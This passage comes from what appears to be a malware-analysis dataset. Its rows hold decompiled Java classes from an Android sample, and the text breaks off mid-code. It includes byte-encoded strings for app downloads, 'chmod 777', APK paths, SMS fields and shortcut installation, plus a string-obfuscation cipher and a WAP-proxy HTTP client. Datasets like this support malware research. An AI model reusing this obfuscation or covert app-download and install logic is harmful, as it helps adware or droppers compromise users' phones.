A={83,68,-27,-115,-95,-27,-83,-104,-27,-126,-88,-25,-87,-70,-23,-105,-76,-28,-72,-115,-24,-74,-77,-17,-68,-116,-24,-81,-73,-27,-120,-96,-23,-103,-92,-28,-72,Byte.MIN_VALUE,-28,-70,-101,-26,-106,-121,-28,-69,-74,-28,-71,-117,-27,-112,-114,-27,-122,-115,-23,-121,-115,-24,-81,-107,-17,-68,-127};   public static final byte[] B={-26,-126,-88,-27,-113,-81,-25,-88,-115,-27,Byte.MIN_VALUE,-103,-23,Byte.MIN_VALUE,-102,-24,-65,-121,-26,-95,-116,-23,-99,-94,-28,-72,-118,32,91};   public static final byte[] C={93,32,-27,-65,-85,-26,-115,-73,-26,-106,-71,-27,-68,-113,-24,-65,-101,-27,-123,-91,-24,-81,-91,-24,-67,-81,-28,-69,-74,-25,-102,-124,-28,-72,-117,-24,-67,-67,-23,-95,-75,-23,-99,-94,-17,-68,-127};   public static final byte[] D={-24,-81,-73,-23,Byte.MIN_VALUE,-119,-26,-117,-87,-27,-123,-79,-28,-70,-85,-26,-106,-71,-27,-68,-113};   public static final byte[] E={72,73,-17,-68,-116,-26,-120,-111,-27,-120,-102,-28,-72,-117,-24,-67,-67,-27,-82,-119,-24,-93,-123,-28,-70,-122};   public static final byte[] F={-17,-68,-116,-26,-124,-97,-24,-89,-119,-28,-72,-115,-23,-108,-103,-17,-68,-116,-25,-119,-71,-26,-124,-113,-26,-114,-88,-24,-115,-112,-25,-69,-103,-28,-67,-96,-17,-68,-127,-28,-72,-117,-24,-67,-67,-27,-100,-80,-27,-99,Byte.MIN_VALUE,-17,-68,-102};   public static final byte[] G={-26,-124,-97,-24,-80,-94,-26,-126,-88,-27,-81,-71};   public static final byte[] H={-25,-102,-124,-26,-108,-81,-26,-116,-127,-17,-68,-127};   public static final byte[] I={83,68,-27,-115,-95,-27,-83,-104,-27,-126,-88,-25,-87,-70,-23,-105,-76,-28,-72,-115,-24,-74,-77,-17,-68,-116,-24,-81,-73,-27,-120,-96,-23,-103,-92,-28,-72,Byte.MIN_VALUE,-28,-70,-101,-26,-106,-121,-28,-69,-74,-28,-71,-117,-27,-112,-114,-27,-122,-115,-23,-121,-115,-24,-81,-107,-17,-68,-127};   public static final byte[] J={-27,-120,-122,-28,-70,-85,-25,-69,-103,-26,-100,-117,-27,-113,-117};   public static final byte[] K={-28,-70,-78,-17,-68,-116,-25,-69,-103,-26,-126,-88,-26,-108,-74,-24,-105,-113,-27,-120,-80,-28,-70,-122,-26,-95,-116,-23,-99,-94,-29,Byte.MIN_VALUE,-126,-23,-102,-113,-27,-65,-125,-28,-72,-117,-24,-67,-67,-17,-68,-116,-24,-67,-69,-26,-99,-66,-25,-108,-97,-26,-76,-69,-17,-68,-127};   public static final byte[] L={-28,-72,-117,-24,-67,-67,-28,-70,-122,-26,-83,-92,-27,-70,-108,-25,-108,-88,-25,-102,-124,-25,-108,-88,-26,-120,-73,-24,-65,-104,-28,-72,-117,-24,-67,-67,-28,-70,-122,-17,-68,-102};   public static final byte[] M={-25,-67,-111,-25,-69,-100,-27,-68,-126,-27,-72,-72,-17,-68,-116,-28,-72,-117,-24,-67,-67,-26,-102,-126,-27,-127,-100};   public static final byte[] N={-25,-67,-111,-25,-69,-100,-27,-68,-126,-27,-72,-72,-17,-68,-116,-28,-72,-117,-24,-67,-67,-25,-69,-120,-26,-83,-94};   public static final byte[] O={-25,-126,-71,-27,-121,-69,-24,-114,-73,-27,-113,-106,-26,-101,-76,-27,-92,-102};   public static final byte[] P={-25,-126,-71,-27,-121,-69,-26,-119,-109,-27,-68,Byte.MIN_VALUE};   public static final byte[] Q={-25,-126,-71,-27,-121,-69,-27,-82,-119,-24,-93,-123};   public static final byte[] R={-28,-72,-117,-24,-67,-67,-27,-82,-119,-24,-93,-123};   public static final byte[] S={-26,-83,-93,-27,-100,-88,-28,-72,-117,-24,-67,-67,46,46,46};   public static final byte[] T={-25,-69,-89,-25,-69,-83,-28,-72,-117,-24,-67,-67};   public static final byte[] U={-26,-83,-93,-27,-100,-88,-28,-72,-117,-24,-67,-67,32,32,32,32};   public static final byte[] V={-25,-85,-117,-27,-115,-77,-28,-67,-109,-23,-86,-116};   public static final byte[] W={-27,-112,-115,-25,-89,-80,-17,-68,-102,32};   public static final byte[] X={-25,-79,-69,-27,-98,-117,-17,-68,-102,32};   public static final byte[] Y={-25,-119,-120,-26,-100,-84,-17,-68,-102,32};   public static final byte[] Z={-27,-92,-89,-27,-80,-113,-17,-68,-102,32};   public static final byte[] aa={-27,-92,-89,-27,-80,-113,-17,-68,-102,32};   public static final byte[] ab={-26,-105,-74,-23,-105,-76,-17,-68,-102,32};   public static final byte[] ac={-26,-119,-109,-27,-68,Byte.MIN_VALUE};   public static final byte[] ad={-28,-72,-117,-24,-67,-67,-27,-82,-116,-26,-120,-112};   public static final byte[] ae={-25,-126,-71,-26,-120,-111,-23,-121,-115,-26,-106,-80,-27,-118,-96,-24,-67,-67};   public static final byte[] af={-26,-83,-93,-27,-100,-88,-26,-119,-109,-27,-68,Byte.MIN_VALUE};   public static final byte[] ag={-26,-83,-93,-27,-100,-88,-27,-118,-96,-24,-67,-67};   public static final byte[] ah={-27,-82,-119,-24,-93,-123,-27,-82,-116,-26,-120,-112};   public static final byte[] ai={-27,-120,-105,-24,-95,-88,-24,-81,-73,-26,-79,-126,-27,-92,-79,-24,-76,-91};   public static final byte[] aj={-25,-82,Byte.MIN_VALUE,-28,-69,-117};   public static final byte[] ak={-25,-78,-66,-27,-67,-87,-26,-114,-88,-24,-115,-112};   public static final byte[] al={-27,-118,-96,-24,-67,-67,-28,-72,-83,46,46,46};   public static final byte[] am={32,-27,-123,-115,-24,-76,-71,-28,-72,-117,-24,-67,-67,32,32,32};   public static final byte[] an={-27,-66,-123,87,73,70,73,-28,-72,-117,-24,-67,-67};   public static final byte[] ao={-25,-125,-83,-23,-105,-88,97,112,112,-17,-68,-116,-24,-93,-123,-26,-100,-70,-27,-65,-123,-27,-92,-121};   public static final byte[] ap={-27,-120,-122,-28,-70,-85,-25,-69,-103,-26,-100,-117,-27,-113,-117};   public static final byte[] aq={119,105,102,105,-28,-72,-117,-23,-94,-124,-25,-70,-90,-28,-72,-117,-24,-67,-67};   public static final byte[] ar={83,68,-27,-115,-95,-27,-83,-104,-27,-126,-88,-25,-87,-70,-23,-105,-76,-28,-72,-115,-24,-74,-77,-17,-68,-116,-24,-81,-73,-27,-120,-96,-23,-103,-92,-28,-72,Byte.MIN_VALUE,-28,-70,-101,-26,-106,-121,-28,-69,-74,-28,-71,-117,-27,-112,-114,-27,-122,-115,-23,-121,-115,-24,-81,-107,-17,-68,-127};   public static final byte[] as={87,73,70,73,-28,-72,-117,-24,-67,-67};   public static final byte[] at={-26,-126,-88,-23,-94,-124,-25,-70,-90,119,105,102,105,-28,-72,-117,-24,-67,-67,-25,-102,-124};   public static final byte[] au={-17,-68,-116,-27,-80,-122,-27,-100,-88,119,105,102,105,-25,-102,-124,-25,-114,-81,-27,-94,-125,-28,-72,-70,-26,-126,-88,-28,-72,-117,-24,-67,-67,-17,-68,-127};   public static final byte[] av={-26,-77,-88,-27,-122,-116,-27,-92,-79,-24,-76,-91};   public static final byte[] aw={-26,-126,-88,-28,-71,-117,-27,-119,-115,-23,-94,-124,-25,-70,-90,-25,-102,-124};   public static final byte[] ax={-27,-67,-109,-27,-119,-115,-28,-72,-70,119,105,102,105,-25,-118,-74,-26,Byte.MIN_VALUE,-127,-17,-68,-116,-25,-114,-80,-27,-100,-88,-26,-83,-93,-27,-100,-88,-28,-72,-70,-26,-126,-88,-28,-72,-117,-24,-67,-67,46,46,46};   public static final byte[] ay={98,105,110,47,112,46,116,120,116};   public static final byte[] az={98,105,110,47,109,46,116,120,116};   public static final byte[] aA={45,45,45,45,45,45,45,98,109,32,61,61,32};   public static final byte[] aB={115,118,103,112,116,46,100,97,116};   public static final byte[] aC={114,118,103,112,116,46,100,97,116};   public static final byte[] aD={99,108,115,118,103,112,116,46,100,97,116};   public static final byte[] aE={97,108,108,95,97,112,112,95,99,111,117,110,116};   public static final byte[] aF={110,32,115,112,97,99,101,32,116,33};   public static final byte[] aG={118,105,100,32,61,61,32};   public static final byte[] aH={99,105,100,32,61,61,32};   public static final byte[] aI={112,105,100,32,61,61,32};   public static final byte[] aJ={110,111,32,114,101,115,44,32,110,111,32,114,101,113,33};   public static final byte[] aK={32,114,116,114,46,46,46};   public static final byte[] aL={32,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,32,114,101,113,32,116,32,97,100,33};   public static final byte[] aM={32,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,32,110,114,101,113};   public static final byte[] aN={46,97,112,107};   public static final byte[] aO={47,100,97,116,97,47,100,97,116,97,47};   public static final byte[] aP={99,104,109,111,100,32,55,55,55,32};   public static final byte[] aQ={99,111,110,116,101,110,116,58,47,47,100,111,119,110,108,111,97,100,115,47,100,111,119,110,108,111,97,100};   public static final byte[] aR={95,105,100};   public static final byte[] aS={117,114,108};   public static final byte[] aT={102,105,108,101};   public static final byte[] aU={115,105,122,101};   public static final byte[] aV={116,111,116,97,108,95,115,105,122,101};   public static final byte[] aW={115,116,97,116,101};   public static final byte[] aX={110,101,116,119,111,114,107,95,105,110,102,111};   public static final byte[] aY={102,105,108,101,95,110,97,109,101};   public static final byte[] aZ={100,111,119,110,108,111,97,100,95,109,111,100,101};   public static final byte[] ba={101,84,97,103};   public static final byte[] bb={99,114,101,97,116,116,105,109,101};   public static final byte[] bc={-25,-67,-111,-25,-69,-100,-24,-65,-108,-27,-101,-98,-26,-106,-83,-25,-126,-71,-26,-107,-80,-26,-115,-82,-28,-72,-115,-26,-83,-93,-25,-95,-82};   public static final byte[] bd={-26,-100,-115,-27,-118,-95,-27,-103,-88,-28,-72,-115,-26,-108,-81,-26,-116,-127,-26,-106,-83,-25,-126,-71,-17,-68,-116,-23,-121,-115,-26,-106,-80,-28,-72,-117,-24,-67,-67};   public static final byte[] be={124,35,42};   public static final byte[] bf={-27,-82,-119,-27,-123,-88};   public static final byte[] bg={-26,-105,-96,-27,-71,-65,-27,-111,-118};   public static final byte[] bh={-27,-82,-104,-26,-106,-71,-25,-119,-120,-26,-100,-84};   public static final byte[] bi={-27,-70,-108,-25,-108,-88,-25,-82,Byte.MIN_VALUE,-28,-69,-117};   public static final byte[] bj={-28,-72,-117,-24,-67,-67,-17,-68,-102};   public static final byte[] bk={-25,-125,-83,-23,-105,-88,65,80,80};   public static final byte[] bl={97,112,112,67,111,117,110,116};   public static final byte[] bm={105,100};   public static final byte[] bn={105,115,69,120,105,116,76,105,115,116};   public static final byte[] bo={116,101,115,116,65,105,100};   public static final byte[] bp={116,97,103};   public static final byte[] bq={102,105,108,101,80,97,116,104};   public static final byte[] br={46,100,97,116};   public static final byte[] bs={46,116,109,112};   public static final byte[] bt={117,114,108,32,61,32,63,32,97,110,100,32,102,105,108,101,32,61,32,63};   public static final byte[] bu={100,101,108,101,116,101,32,102,114,111,109,32};   public static final byte[] bv={98,121,116,101,115,61};   public static final byte[] bw={82,97,110,103,101};   public static final byte[] bx={98,121,116,101,115,61,48,45};   public static final byte[] by={102,105,108,101,110,97,109,101};   public static final byte[] bz={-26,-114,-88,-24,-115,-112};   public static final byte[] bA={-27,-70,-108,-25,-108,-88,-24,-67,-81,-28,-69,-74};   public static final byte[] bB={72,116,116,112,67,111,110,110,101,99,116,105,111,110,81,117,101,117,101,64};   public static final byte[] bC={99,109,119,97,112};   public static final byte[] bD={117,110,105,119,97,112};   public static final byte[] bE={99,116,119,97,112,58,99,100,109,97};   public static final byte[] bF={99,116,119,97,112};   public static final byte[] bG={49,48,46,48,46,48,46,49,55,50};   public static final byte[] bH={49,48,46,48,46,48,46,50,48,48};   public static final byte[] bI={114,101,113,117,101,115,116,77,111,100,101};   public static final byte[] bJ={114,101,113,84,121,112,101};   public static final byte[] bK={97,100,118,101,114,116,73,100};   public static final byte[] bL={112,114,111,103,114,101,115,115};   public static final byte[] bM={100,70,105,110,105,115,104};   public static final byte[] bN={97,98,111,114,116};   public static final byte[] bO={109,101,115,115,97,103,101};   public static final byte[] bP={115,104,97,114,101,100,105,100};   public static final byte[] bQ={115,104,111,114,116,99,117,116};   public static final byte[] bR={105,115,68,111,119,110,108,111,97,100,105,110,103};   public static final byte[] bS={118,105,115,105,98,105,108,105,116,121};   public static final byte[] bT={100,101,115,99,114,105,112,116,105,111,110};   public static final byte[] bU={104,105,110,116};   public static final byte[] bV={109,105,109,101,116,121,112,101};   public static final byte[] bW={116,105,116,108,101};   public static final byte[] bX={97,112,112,108,105,99,97,116,105,111,110,47,118,110,100,46,97,110,100,114,111,105,100,46,112,97,99,107,97,103,101,45,97,114,99,104,105,118,101};   public static final byte[] bY={-25,-126,-71,-27,-121,-69,-23,-121,-115,-26,-106,-80,-27,-118,-96,-24,-67,-67};   public static final byte[] bZ={97,112,112,67,111,117,110,116};   public static final byte[] ca={114,101,113,84,121,112,101};   public static final byte[] cb={101,120,105,116,76,105,115,116,73,100};   public static final byte[] cc={118,95,108};   public static final byte[] cd={110,101,120,116,82,101,113,117,101,115,116};   public static final byte[] ce={100,97,116,101};   public static final byte[] cf={97,100,115,83,116,97,116,101};   public static final byte[] cg={97,100,115,83,116,97,116,101};   public static final byte[] ch={118,112,95,115,104,111,114,116,99,117,116};   public static final byte[] ci={115,104,111,114,116,99,117,116};   public static final byte[] cj={98,105,110,47,118,46,100,97,116};   public static final byte[] ck={105,110,118,97,108,105,100,32,110,105,110,101,45,112,97,116,99,104,58};   public static final byte[] cl={115,109,115,116,111};   public static final byte[] cm={115,109,115,95,98,111,100,121};   public static final byte[] cn={116,101,120,116,47,112,108,97,105,110};   public static final byte[] co={77,111,98,105,108,101,32,83,111,108,117,116,105,111,110};   public static final byte[] cp={-25,-126,-71,-27,-121,-69,-27,-120,-73,-26,-106,-80,46,46,46};   public static final byte[] cq={-24,-114,-73,-27,-113,-106,-26,-101,-76,-27,-92,-102};   public static final byte[] cr={-26,-83,-93,-27,-100,-88,-27,-118,-96,-24,-67,-67};   public static final byte[] cs={-25,-126,-71,-27,-121,-69,-24,-114,-73,-27,-113,-106,-26,-101,-76,-27,-92,-102};   public static final byte[] ct={109,115,103,73,100};   public static final byte[] cu={116,101,108,58};   public static final byte[] cv={99,111,109,46,103,111,111,103,108,101,46,97,110,100,114,111,105,100,46,97,112,112,115,46,109,97,112,115};   public static final byte[] cw={105,115,76,111,99,107};   public static final byte[] cx={99,111,109,46,97,110,100,114,111,105,100,46,108,97,117,110,99,104,101,114,46,97,99,116,105,111,110,46,73,78,83,84,65,76,76,95,83,72,79,82,84,67,85,84};   public static final byte[] cy={105,108,100};   public static final byte[] cz={97,108,109};   public static final byte[] cA={83,116,97,114,116,105,110,103,65,108,101,114,116,77,101,115,115,97,103,101};   public static final byte[] cB={98,105,110};   public static final byte[] cC={97,98,99};   public static final byte[] cD={45,45,45,45,45,45,45,115,77,32,61,61,32};   public static final byte[] cE={101,83,83,32,61,32};   public static final byte[] cF={45,45,45,45,45,45,45,45,45,45,45,115,58,32};   public static final byte[] cG={115,101,114,118,105,99,101};   public static final byte[] cH={46,97,112,107};   public static final byte[] cI={46,106,112,103,46,100,97,116};   public static final byte[] cJ={110,111,117,115,114,46,100,97,116};   public static final byte[] cK={103,101,116,77,101,115,115,97,103,101};   public static final byte[] cL={114,101,113,117,101,115,116,73,100};   public static final byte[] cM={37,94,38,42};   public static final byte[] cN={112,97,99,107,97,103,101,58};   public static final byte[] cO={116,121,112,101};   public static final byte[] cP={83,116,97,114,116,105,110,103,65,108,101,114,116,83,101,114,118,105,99,101};   public static final byte[] cQ={110,105,114,116,32,97,114,101,97,33}; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\c.code","public class c {   private static int a;   private static int b=240;   public static int a(  Context context,  int i){     if (a == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       a=displayMetrics.densityDpi;     }     return (a * i) / b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\d.code","public class d {   private static int[] a={74,29,39,41,46,70,9,37,82,78,82,26,43,31,9,12,93,72,74,12,20,92,33,8,17,30,77,85,67,65,75,23,82,61,1,83,7,24,84,79,10,71,71,65,11,54,95,37,77,14,81,10,60,58,95,61,88,92,71,78,35,91,9,52,45,59,41,19,66,35,0,78,68,68,6,21,97,33,33,64,12,78,47,7,21,36,38,20,82,16,7,47,7,44,58,16,40,43,55,35,48,63,44,78,32,83,25,18,74,83,62,40,40,68,18,79,10,34,31,23,77,78,24,94,24,13,0,45,88,9,1,59,56,95,85,0,70,84,15,60,55,49,60,15,68,18,59,62,4,60,91,29,57,9,99,64,46,85,17,28,78,27,20,85,71,41,4,5,64,83,55,35,27,11,31,16,73,96,22,92,71,9,89,48,99,99,9,63,64,39,89,26,42,43,70,29,65,47,24,27};   public static String a(  String str){     if (str == null) {       return """";     }     StringBuilder sb=new StringBuilder();     sb.append(""s"");     char[] charArray=str.toCharArray();     for (int i=0; i < charArray.length; i++) {       try {         sb.append((char)(charArray[i] + a[i % a.length]));       }  catch (      Exception e) {         com.baty.pczy.facy.pap.f.g.a(e);       }     }     sb.append(""e"");     return sb.toString();   }   public static String b(  String str){     if (str == null || !str.startsWith(""s"") || !str.endsWith(""e"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         sb2.append((char)(charArray[i] - a[i % a.length]));       }  catch (      Exception e) {         com.baty.pczy.facy.pap.f.g.a(e);       }     }     return sb2.toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\e.code","public class e {   public static HttpClient a(  Context context){     if (b(context) == null) {       return null;     }     if (!c(context)) {       DefaultHttpClient defaultHttpClient=new DefaultHttpClient();       HttpParams params=defaultHttpClient.getParams();       params.setParameter(""http.connection.timeout"",30000);       params.setParameter(""http.socket.timeout"",30000);       return defaultHttpClient;     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,102400);     HttpClientParams.setRedirecting(basicHttpParams,true);     basicHttpParams.setParameter(""http.route.default-proxy"",new HttpHost(g.d(context,40),80));     return new DefaultHttpClient(basicHttpParams);   }   public static String b(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     String extraInfo=activeNetworkInfo.getExtraInfo();     return (extraInfo == null || extraInfo.length() <= 0) ? activeNetworkInfo.getTypeName() : extraInfo;   }   private static boolean c(  Context context){     String extraInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo().getExtraInfo();     if (extraInfo == null) {       return false;     }     return ""cmwap"".equalsIgnoreCase(extraInfo) || ""3gwap"".equalsIgnoreCase(extraInfo) || ""uniwap"".equalsIgnoreCase(extraInfo);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\f.code","public class f {   public Rect a=new Rect();   public int[] b;   public int[] f93c;   public int[] d;   public static f a(  byte[] bArr){     ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());     if (order.get() == 0) {       return null;     }     f fVar=new f();     fVar.b=new int[order.get()];     fVar.f93c=new int[order.get()];     fVar.d=new int[order.get()];     a(fVar.b.length);     a(fVar.f93c.length);     order.getInt();     order.getInt();     fVar.a.left=order.getInt();     fVar.a.right=order.getInt();     fVar.a.top=order.getInt();     fVar.a.bottom=order.getInt();     order.getInt();     a(fVar.b,order);     a(fVar.f93c,order);     a(fVar.d,order);     return fVar;   }   private static void a(  int i){     if (i == 0 || (i & 1) != 0) {       throw new RuntimeException(com.baty.pczy.facy.pap.p.a.ck + i);     }   }   private static void a(  int[] iArr,  ByteBuffer byteBuffer){     int length=iArr.length;     for (int i=0; i < length; i++) {       iArr[i]=byteBuffer.getInt();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\g.code","public class g {   private static int a;   private static Map b=new HashMap();   private static Map f94c=new HashMap();   private static int a(  Context context){     if (a == 0) {       int i=context.getResources().getDisplayMetrics().densityDpi;       a=(int)((i * i) / 240.0f);     }     return a;   }   public static Drawable a(  Context context,  int i){     if (f94c.containsKey(Integer.valueOf(i))) {       return a(context,(Bitmap)f94c.get(Integer.valueOf(i)));     }     Bitmap e=e(context,i);     if (e != null) {       return a(context,e);     }     return null;   }   public static Drawable a(  Context context,  Bitmap bitmap){     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     bitmapDrawable.setTargetDensity(a(context));     return bitmapDrawable;   }   private static void a(  byte[] bArr){     BufferedReader bufferedReader=new BufferedReader(new StringReader(new String(bArr,""utf-8"")));     while (true) {       String readLine=bufferedReader.readLine();       if (TextUtils.isEmpty(readLine)) {         return;       }       if (readLine.contains(""="") && !readLine.startsWith(""#"")) {         int indexOf=readLine.indexOf(""="");         b.put(Integer.valueOf(readLine.substring(0,indexOf)),readLine.substring(indexOf + 1));       }     }   }   public static Bitmap b(  Context context,  int i){     return f94c.containsKey(Integer.valueOf(i)) ? (Bitmap)f94c.get(Integer.valueOf(i)) : e(context,i);   }   public static Drawable c(  Context context,  int i){     try {       Bitmap bitmap=(Bitmap)f94c.get(Integer.valueOf(i));       Bitmap e=bitmap == null ? e(context,i) : bitmap;       byte[] ninePatchChunk=e.getNinePatchChunk();       if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {         return null;       }       Rect rect=new Rect();       NinePatchDrawable ninePatchDrawable=new NinePatchDrawable(e,ninePatchChunk,f.a(ninePatchChunk).a,null);       ninePatchDrawable.getPadding(rect);       ninePatchDrawable.setTargetDensity(a(context));       return ninePatchDrawable;     }  catch (    Exception e2) {       com.baty.pczy.facy.pap.f.g.a(e2);       return null;     }   }   public static String d(  Context context,  int i){     if (b.size() == 0) {       try {         InputStream open=context.getAssets().open(""pqu"");         DataInputStream dataInputStream=new DataInputStream(open);         while (true) {           int readInt=dataInputStream.readInt();           if (readInt == -1) {             break;           }           int readInt2=dataInputStream.readInt();           if (readInt == 2) {             byte[] bArr=new byte[readInt2];             dataInputStream.read(bArr,0,readInt2);             a(bArr);             break;           }           dataInputStream.skipBytes(readInt2);         }         open.close();       }  catch (      Exception e) {         com.baty.pczy.facy.pap.f.g.a(e);       }     }     String str=(String)b.get(Integer.valueOf(i));     return str == null ? """" : str;   }   private static Bitmap e(  Context context,  int i){     int i2=0;     try {       InputStream open=context.getAssets().open(""pqu"");       DataInputStream dataInputStream=new DataInputStream(open);       while (true) {         int readInt=dataInputStream.readInt();         if (readInt == -1) {           break;         }         int readInt2=dataInputStream.readInt();         if (readInt == 1) {           do {             int readInt3=dataInputStream.readInt();             int readInt4=dataInputStream.readInt();             if (readInt3 == i) {               byte[] bArr=new byte[readInt4];               dataInputStream.read(bArr,0,readInt4);               Bitmap decodeByteArray=BitmapFactory.decodeByteArray(bArr,0,readInt4);               f94c.put(Integer.valueOf(i),decodeByteArray);               return decodeByteArray;             }             dataInputStream.skip(readInt4);             i2=i2 + 4 + 4+ readInt4;           }  while (readInt2 > i2);         }  else {           dataInputStream.skipBytes(readInt2);         }       }       open.close();     }  catch (    Exception e) {     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.s\h.code","public class h {   private static Map a=new HashMap();   private static Map b=new HashMap();   public static Bitmap a(  Context context,  String str){     Bitmap b2;     if ((!a.containsKey(str) || (b2=(Bitmap)((SoftReference)a.get(str)).get()) == null) && (b2=b(context,str)) != null) {       b2.setDensity(240);       a.put(str,new SoftReference(b2));     }     return b2;   }   public static android.graphics.Bitmap b(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.pczy.facy.pap.s.h.b(android.content.Context, java.lang.String):android.graphics.Bitmap"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.t\a.code","public class a extends RelativeLayout {   public boolean a;   public l b;   public j f95c;   View.OnClickListener d;   private ImageView e;   private LinearLayout f;   private TextView g;   private Context h;   private com.baty.pczy.facy.pap.r.a i;   private com.baty.pczy.facy.pap.r.f j;   private Button k;   private Button l;   private com.baty.pczy.facy.pap.e.f m;   public a(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     super(context);     this.a=false;     this.d=new b(this);     this.h=context;     this.m=fVar;     a();     g();   }   private void g(){     this.j.b(this.m);     this.f95c.a(this.m);     this.b.a(this.m.f);     this.g.setText(this.m.h);   }   public void h(){     this.i.setVisibility(0);     this.b.setVisibility(8);   }   public void i(){     this.i.setVisibility(8);     this.b.setVisibility(0);   }   public void a(){     this.j=new com.baty.pczy.facy.pap.r.f(this.h);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.addRule(12,-1);     this.j.setId(20);     addView(this.j,layoutParams);     FrameLayout frameLayout=new FrameLayout(this.h);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);     layoutParams2.addRule(2,20);     addView(frameLayout,layoutParams2);     this.f=new LinearLayout(this.h);     this.f.setOnClickListener(new c(this));     this.f.setId(0);     this.f.setOrientation(1);     this.f.setBackgroundColor(-1);     frameLayout.addView(this.f,new FrameLayout.LayoutParams(-1,-1));     this.e=new ImageView(this.h);     this.e.setImageDrawable(com.baty.pczy.facy.pap.s.g.a(this.h,35));     FrameLayout.LayoutParams layoutParams3=new FrameLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.h,50),com.baty.pczy.facy.pap.s.a.a(this.h,60));     layoutParams3.gravity=51;     frameLayout.addView(this.e,layoutParams3);     LinearLayout linearLayout=new LinearLayout(this.h);     linearLayout.setBackgroundColor(-16740913);     this.f.addView(linearLayout,new LinearLayout.LayoutParams(-1,3));     LinearLayout linearLayout2=new LinearLayout(this.h);     linearLayout2.setOrientation(0);     linearLayout2.setGravity(16);     this.f.addView(linearLayout2,-1,-2);     LinearLayout linearLayout3=new LinearLayout(this.h);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,1);     layoutParams4.gravity=16;     linearLayout3.setBackgroundColor(-4604739);     this.f.addView(linearLayout3,layoutParams4);     RelativeLayout relativeLayout=new RelativeLayout(this.h);     relativeLayout.setBackgroundColor(-2170139);     linearLayout2.addView(relativeLayout,new LinearLayout.LayoutParams(-1,-2));     this.g=new TextView(this.h);     this.g.setSingleLine(true);     this.g.setTextSize(18.0f);     this.g.setTextColor(-12566203);     this.g.setPadding(com.baty.pczy.facy.pap.s.a.a(this.h,15),com.baty.pczy.facy.pap.s.a.a(this.h,10),com.baty.pczy.facy.pap.s.a.a(this.h,5),com.baty.pczy.facy.pap.s.a.a(this.h,10));     RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);     layoutParams5.addRule(14);     relativeLayout.addView(this.g,layoutParams5);     this.f95c=new j(this.h);     this.f.addView(this.f95c,new RelativeLayout.LayoutParams(-1,-2));     this.f.addView(new n(this.h),new LinearLayout.LayoutParams(-1,-2));     ScrollView scrollView=new ScrollView(this.h);     this.f.addView(scrollView,new LinearLayout.LayoutParams(-1,-2,1.0f));     LinearLayout linearLayout4=new LinearLayout(this.h);     linearLayout4.setOrientation(1);     linearLayout4.setPadding(0,0,0,0);     scrollView.addView(linearLayout4,new LinearLayout.LayoutParams(-1,-1));     LinearLayout linearLayout5=new LinearLayout(this.h);     linearLayout5.setPadding(com.baty.pczy.facy.pap.s.a.a(this.h,10),com.baty.pczy.facy.pap.s.a.a(this.h,6),com.baty.pczy.facy.pap.s.a.a(this.h,10),0);     ViewGroup.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     linearLayout5.setGravity(1);     linearLayout4.addView(linearLayout5,layoutParams6);     this.k=new Button(this.h);     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(this.h,80),com.baty.pczy.facy.pap.s.a.a(this.h,30));     layoutParams7.gravity=1;     this.k.setId(18);     this.k.setOnClickListener(this.d);     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},com.baty.pczy.facy.pap.s.g.a(this.h,62));     stateListDrawable.addState(new int[]{R.attr.state_selected},com.baty.pczy.facy.pap.s.g.a(this.h,63));     stateListDrawable.addState(new int[]{R.attr.state_enabled},com.baty.pczy.facy.pap.s.g.a(this.h,61));     this.k.setBackgroundDrawable(stateListDrawable);     linearLayout5.addView(this.k,layoutParams7);     this.l=new Button(this.h);     this.l.setId(19);     this.l.setOnClickListener(this.d);     StateListDrawable stateListDrawable2=new 